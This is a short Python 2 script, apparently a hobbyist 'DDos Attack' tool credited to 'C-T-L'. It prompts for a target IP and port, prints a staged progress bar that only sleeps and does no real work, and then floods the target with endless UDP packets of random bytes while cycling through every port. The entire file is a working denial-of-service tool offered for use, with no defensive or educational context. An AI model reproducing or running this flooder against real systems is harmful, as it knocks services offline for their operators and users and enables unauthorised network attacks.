import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print
print "Author   : C-T-L"
print "You Tube : https://www.youtube.com/channel/UCAyg6ueTK6ht1ipOpebL3WA"
print "github   : https://github.com/c-t-l"
print
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Dos")
print "[                    ] preparing"
time.sleep(5)
print "[=====               ] started"
time.sleep(5)
print "[==========          ] finding port"
time.sleep(5)
print "[===============     ] port finded"
time.sleep(5)
print "[====================] Attacking"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

